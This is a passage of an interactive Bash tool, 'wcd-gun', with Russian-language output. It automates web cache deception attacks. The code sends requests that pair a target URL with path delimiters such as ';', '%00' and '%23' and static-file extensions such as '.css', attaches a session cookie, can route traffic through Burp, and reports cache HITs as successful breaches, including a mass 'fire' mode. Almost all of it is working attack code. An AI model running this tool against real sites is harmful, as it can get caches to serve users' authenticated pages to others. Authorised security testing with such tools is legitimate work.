    echo -e "${CYAN}├─────────────────────────────────────────────────────────────┤${NC}"
    echo -e "${CYAN}│ ${RED}HIT${CYAN} — кэш отдал данные (УЯЗВИМОСТЬ)  ${GREEN}BYPASS${CYAN} — защита       │${NC}"
    echo -e "${CYAN}│ ${YELLOW}MISS${CYAN} — кэш пуст                     ${BLUE}NO_CACHE${CYAN} — нет заголовка│${NC}"
    echo -e "${CYAN}└─────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    for delim in "${DELIMITERS[@]}"; do
        for ext in "${EXTENSIONS[@]}"; do
            ((current++))
            local attack_url="${TARGET}${delim}test${ext}"
            
            local response=$(do_curl "$attack_url" "-s -I")
            local cache_status=$(echo "$response" | grep -i "X-Cache-Status" | head -1 | awk '{print $2}' | tr -d '\r')
            local bypass=$(echo "$response" | grep -i "X-WCD-Bypass" | head -1 | awk '{print $2}' | tr -d '\r')
            local http_code=$(echo "$response" | head -1 | awk '{print $2}' | tr -d '\r\n')
            
            printf "[%3d/%3d] " $current $total_tests
            
            if [[ "$cache_status" == "HIT" ]]; then
                echo -e "${RED}[!] ПРОБИТИЕ!${NC} $attack_url"
                echo -e "         → HTTP $http_code, Cache: ${RED}$cache_status${NC}"
                ((hits++))
            elif [[ "$cache_status" == "BYPASS" ]]; then
                echo -e "${GREEN}[✓] ЗАЩИТА${NC}   $attack_url"
                ((bypasses++))
            elif [[ "$cache_status" == "MISS" ]]; then
                echo -e "${YELLOW}[?] MISS${NC}     $attack_url"
                ((misses++))
            else
                echo -e "${BLUE}[ ] NO_CACHE${NC} $attack_url"
                ((errors++))
            fi
            sleep 0.1
        done
    done

    # =========================================================================
    # ИТОГИ
    # =========================================================================
    echo ""
    echo -e "${WHITE}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║  📊 ИТОГИ ОБСТРЕЛА                                             ║${NC}"
    echo -e "${WHITE}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo -e "  ${CYAN}Всего векторов:${NC} $total_tests"
    echo -e "  ${RED}🔴 HIT:${NC} $hits  ${GREEN}🟢 BYPASS:${NC} $bypasses  ${YELLOW}🟡 MISS:${NC} $misses  ${BLUE}🔵 ERR:${NC} $errors"
    echo ""
    
    if [[ $hits -gt 0 ]]; then
        echo -e "${RED}⚠️  ВЕРДИКТ: ОБНАРУЖЕНА УЯЗВИМОСТЬ Web Cache Deception!${NC}"
    else
        echo -e "${GREEN}✅ ВЕРДИКТ: УЯЗВИМОСТЬ НЕ ОБНАРУЖЕНА${NC}"
    fi
    echo -e "${WHITE}═══════════════════════════════════════════════════════════════${NC}"
}

# =============================================================================
# УПРАВЛЕНИЕ РАЗДЕЛИТЕЛЯМИ
# =============================================================================
add_delimiter() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи разделитель${NC}"
        return 1
    fi
    DELIMITERS+=("$1")
    echo -e "${GREEN}[+] Разделитель добавлен: $1${NC}"
}

add_delimiters_batch() {
    echo -e "${CYAN}[*] Введи разделители через пробел:${NC}"
    read -p "> " -a new_delimiters
    
    if [[ ${#new_delimiters[@]} -eq 0 ]]; then
        echo -e "${RED}[!] Не введено ни одного разделителя${NC}"
        return 1
    fi
    
    for d in "${new_delimiters[@]}"; do
        DELIMITERS+=("$d")
    done
    
    echo -e "${GREEN}[+] Добавлено ${#new_delimiters[@]} разделителей${NC}"
    show_delimiters
}

remove_delimiter() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи разделитель для удаления${NC}"
        return 1
    fi
    local new_array=()
    local found=0
    for d in "${DELIMITERS[@]}"; do
        if [[ "$d" != "$1" ]]; then
            new_array+=("$d")
        else
            found=1
        fi
    done
    DELIMITERS=("${new_array[@]}")
    if [[ $found -eq 1 ]]; then
        echo -e "${YELLOW}[-] Разделитель удалён: $1${NC}"
    else
        echo -e "${RED}[!] Разделитель не найден: $1${NC}"
    fi
}

clear_delimiters() {
    DELIMITERS=()
    echo -e "${YELLOW}[-] Обойма разделителей очищена${NC}"
}

reset_delimiters() {
    DELIMITERS=(";" "." "?" "%00" "%23" "%3F" "%0A" "%09" "%20")
    echo -e "${GREEN}[+] Обойма разделителей сброшена к стандартной${NC}"
    show_delimiters
}

show_delimiters() {
    echo ""
    echo -e "${CYAN}Текущие разделители (${#DELIMITERS[@]}):${NC}"
    if [[ ${#DELIMITERS[@]} -eq 0 ]]; then
        echo -e "${YELLOW}  (пусто)${NC}"
    else
        local i=1
        for d in "${DELIMITERS[@]}"; do
            echo "  $i) $d"
            ((i++))
        done
    fi
    echo ""
}

# =============================================================================
# УПРАВЛЕНИЕ РАСШИРЕНИЯМИ
# =============================================================================
add_extension() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи расширение${NC}"
        return 1
    fi
    local ext="$1"
    [[ "$ext" != .* ]] && ext=".$ext"
    EXTENSIONS+=("$ext")
    echo -e "${GREEN}[+] Расширение добавлено: $ext${NC}"
}

add_extensions_batch() {
    echo -e "${CYAN}[*] Введи расширения через пробел:${NC}"
    read -p "> " -a new_extensions
    
    if [[ ${#new_extensions[@]} -eq 0 ]]; then
        echo -e "${RED}[!] Не введено ни одного расширения${NC}"
        return 1
    fi
    
    for e in "${new_extensions[@]}"; do
        local ext="$e"
        [[ "$ext" != .* ]] && ext=".$ext"
        EXTENSIONS+=("$ext")
    done
    
    echo -e "${GREEN}[+] Добавлено ${#new_extensions[@]} расширений${NC}"
    show_extensions
}

remove_extension() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи расширение для удаления${NC}"
        return 1
    fi
    local ext="$1"
    [[ "$ext" != .* ]] && ext=".$ext"
    
    local new_array=()
    local found=0
    for e in "${EXTENSIONS[@]}"; do
        if [[ "$e" != "$ext" ]]; then
            new_array+=("$e")
        else
            found=1
        fi
    done
    EXTENSIONS=("${new_array[@]}")
    if [[ $found -eq 1 ]]; then
        echo -e "${YELLOW}[-] Расширение удалено: $ext${NC}"
    else
        echo -e "${RED}[!] Расширение не найдено: $ext${NC}"
    fi
}

clear_extensions() {
    EXTENSIONS=()
    echo -e "${YELLOW}[-] Обойма расширений очищена${NC}"
}

reset_extensions() {
    EXTENSIONS=(".css" ".js" ".jpg" ".ico")
    echo -e "${GREEN}[+] Обойма расширений сброшена к стандартной${NC}"
    show_extensions
}

show_extensions() {
    echo ""
    echo -e "${CYAN}Текущие расширения (${#EXTENSIONS[@]}):${NC}"
    if [[ ${#EXTENSIONS[@]} -eq 0 ]]; then
        echo -e "${YELLOW}  (пусто)${NC}"
    else
        for e in "${EXTENSIONS[@]}"; do
            echo "  - $e"
        done
    fi
    echo ""
}

# =============================================================================
# ПРОЧИЕ ФУНКЦИИ
# =============================================================================
set_target() {
    if [[ -z "$1" ]]; then
        echo -e "${RED}[!] Укажи URL цели${NC}"
        return 1
    fi
    TARGET="$1"
    echo -e "${GREEN}[+] Цель установлена: $TARGET${NC}"
    check_target
}

set_cookie() {
    COOKIE="$1"
    if [[ -z "$COOKIE" ]]; then
        echo -e "${YELLOW}[*] Кука очищена${NC}"
    else
        echo -e "${GREEN}[+] Кука установлена: $COOKIE${NC}"
        validate_cookie
    fi
}

set_proxy() {
    if [[ "$1" == "on" || "$1" == "enable" ]]; then
        if check_burp; then
            USE_PROXY=true
            PROXY_STRING="--proxy http://${BURP_HOST}:${BURP_PORT}"
            echo -e "${GREEN}[+] Проксирование ВКЛЮЧЕНО${NC}"
        else
            echo -e "${RED}[!] Burp Suite недоступен${NC}"
        fi
    elif [[ "$1" == "off" || "$1" == "disable" ]]; then
        USE_PROXY=false
        PROXY_STRING=""
        echo -e "${YELLOW}[*] Проксирование ОТКЛЮЧЕНО${NC}"
    else
        echo -e "${YELLOW}[*] Используй: proxy on|off${NC}"
    fi
}

show_target() {
    echo -e "${CYAN}Текущая цель:${NC} ${TARGET:-НЕ ЗАДАНА}"
    [[ -n "$TARGET" ]] && check_target
}

show_cookie() {
    if [[ -n "$COOKIE" ]]; then
        echo -e "${CYAN}Текущая кука:${NC} $COOKIE"
        validate_cookie
    else
        echo -e "${CYAN}Текущая кука:${NC} ${YELLOW}НЕ ЗАДАНА${NC}"
    fi
}

show_proxy() {
    if [[ "$USE_PROXY" == true ]]; then
        echo -e "${CYAN}Прокси:${NC} ${GREEN}ВКЛЮЧЕН${NC} (${BURP_HOST}:${BURP_PORT})"
    else
        echo -e "${CYAN}Прокси:${NC} ${YELLOW}ОТКЛЮЧЕН${NC}"
    fi
}

show_magazines() {
    echo ""
    list_delimiters_magazines
    list_extensions_magazines
}

show_help() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}📖 КОМАНДЫ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${WHITE}🎯 ЦЕЛЬ И КУКА:${NC}"
    echo "  set target <URL>      — установить цель"
    echo "  set cookie <COOKIE>   — установить куку"
    echo "  target                — показать цель"
    echo "  cookie                — показать куку"
    echo ""
    echo -e "${WHITE}🔌 ПРОКСИ:${NC}"
    echo "  proxy on|off          — вкл/выкл прокси (Burp)"
    echo ""
    echo -e "${WHITE}🔫 ОДИНОЧНЫЕ ВЫСТРЕЛЫ:${NC}"
    echo "  single [D] [E]        — полный цикл (прогрев + проверка)"
    echo "  quick [D] [E]         — быстрая проверка (без прогрева)"
    echo "  show [D] [E]          — показать полный ответ"
    echo "  Если D или E не указаны, берётся первый элемент из обоймы."
    echo "  Используй 'none' чтобы отключить разделитель или расширение."
    echo "  Примеры:"
    echo "    single ; .css       — явно указаны оба"
    echo "    single ;            — разделитель ';', расширение из обоймы"
    echo "    single .css         — расширение '.css', разделитель из обоймы"
    echo "    single              — разделитель и расширение из обойм"
    echo "    single none .css    — без разделителя, только расширение"
    echo ""
    echo -e "${WHITE}📦 РАЗДЕЛИТЕЛИ:${NC}"
    echo "  add <CHAR>            — добавить разделитель"
    echo "  addmany               — добавить несколько"
    echo "  remove <CHAR>         — удалить разделитель"
    echo "  delimiters            — показать разделители"
    echo "  clear_delimiters      — очистить"
    echo "  reset_delimiters      — сбросить"
    echo ""
    echo -e "${WHITE}📦 РАСШИРЕНИЯ:${NC}"
    echo "  addext <EXT>          — добавить расширение"
    echo "  addextmany            — добавить несколько"
    echo "  remext <EXT>          — удалить расширение"
    echo "  extensions            — показать расширения"
    echo "  clear_extensions      — очистить"
    echo "  reset_extensions      — сбросить"
    echo ""
    echo -e "${WHITE}💾 ОБОЙМЫ:${NC}"
    echo "  save_d <name>         — сохранить разделители"
    echo "  load_d <name>         — загрузить разделители"
    echo "  list_d                — список обойм разделителей"
    echo "  delete_d <name>       — удалить обойму разделителей"
    echo "  save_e <name>         — сохранить расширения"
    echo "  load_e <name>         — загрузить расширения"
    echo "  list_e                — список обойм расширений"
    echo "  delete_e <name>       — удалить обойму расширений"
    echo ""
    echo -e "${WHITE}🔥 АТАКА:${NC}"
    echo "  fire                  — ДВУХФАЗНЫЙ ОБСТРЕЛ ВСЕМИ"
    echo ""
    echo "  check [URL]           — проверить доступность"
    echo "  clear                 — очистить экран"
    echo "  help                  — это сообщение"
    echo "  exit                  — выход"
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
}

# =============================================================================
# ГЛАВНЫЙ ЦИКЛ
# =============================================================================
main() {
    [[ -n "$1" ]] && TARGET="$1"
    
    banner
    setup_proxy
    
    if [[ -z "$TARGET" ]]; then
        echo ""
        read -p "🎯 Цель: " TARGET
    fi
    
    [[ -n "$TARGET" ]] && check_target
    
    if [[ -z "$COOKIE" ]]; then
        echo ""
        read -p "🍪 Кука (Enter чтобы пропустить): " COOKIE
    fi
    
    [[ -n "$COOKIE" ]] && validate_cookie
    
    banner
    
    echo -e "${GREEN}[+] Цель: ${WHITE}$TARGET${NC}"
    echo -e "${GREEN}[+] Кука: ${WHITE}${COOKIE:-НЕТ}${NC}"
    echo -e "${GREEN}[+] Прокси: ${WHITE}$([[ "$USE_PROXY" == true ]] && echo "Burp ${BURP_HOST}:${BURP_PORT}" || echo "ОТКЛЮЧЕН")${NC}"
    echo ""
    echo -e "${CYAN}Введи 'help' для списка команд${NC}"
    
    while true; do
        echo ""
        read -p "wcd-gun > " cmd arg1 arg2
        
        case $cmd in
            "set")
                case $arg1 in
                    "target") set_target "$arg2" ;;
                    "cookie") set_cookie "$arg2" ;;
                    *) echo -e "${RED}Используй: set target <URL> или set cookie <COOKIE>${NC}" ;;
                esac
                ;;
            "proxy")
                set_proxy "$arg1"
                ;;
            "target")
                show_target
                ;;
            "cookie")
                show_cookie
                ;;
            "single")
                single_shot "$arg1" "$arg2"
                ;;
            "quick")
                quick_shot "$arg1" "$arg2"
                ;;
            "show")
                show_response "$arg1" "$arg2"
                ;;
            "add")
                add_delimiter "$arg1"
                ;;
            "addmany")
                add_delimiters_batch
                ;;
            "remove")
                remove_delimiter "$arg1"
                ;;
            "delimiters")
                show_delimiters
                ;;
            "clear_delimiters")
                clear_delimiters
                ;;
            "reset_delimiters")
                reset_delimiters
                ;;
            "addext")
                add_extension "$arg1"
                ;;
            "addextmany")
                add_extensions_batch
                ;;
            "remext")
                remove_extension "$arg1"
                ;;
            "extensions")
                show_extensions
                ;;
            "clear_extensions")
                clear_extensions
                ;;
            "reset_extensions")
                reset_extensions
                ;;
            "save_d")
                save_delimiters_magazine "$arg1"
                ;;
            "load_d")
                load_delimiters_magazine "$arg1"
                ;;
            "list_d")
                list_delimiters_magazines
                ;;
            "delete_d")
                delete_delimiters_magazine "$arg1"
                ;;
            "save_e")
                save_extensions_magazine "$arg1"
                ;;
            "load_e")
                load_extensions_magazine "$arg1"
                ;;
            "list_e")
                list_extensions_magazines
                ;;
            "delete_e")
                delete_extensions_magazine "$arg1"
                ;;
            "magazines")
                show_magazines
                ;;
            "fire")
                fire
                ;;
            "check")
                check_target "$arg1"
                ;;
            "clear")
                banner
                ;;
            "help"|"?")
                show_help
                ;;
            "exit"|"quit")
                echo -e "${YELLOW}Выключаю пулемёт...${NC}"
                exit 0
                ;;
            "")
                ;;
            *)
                echo -e "${RED}Неизвестная команда: $cmd${NC}"
                ;;
        esac
    done
}

# =============================================================================
# ТОЧКА ВХОДА
# =============================================================================
main "$@"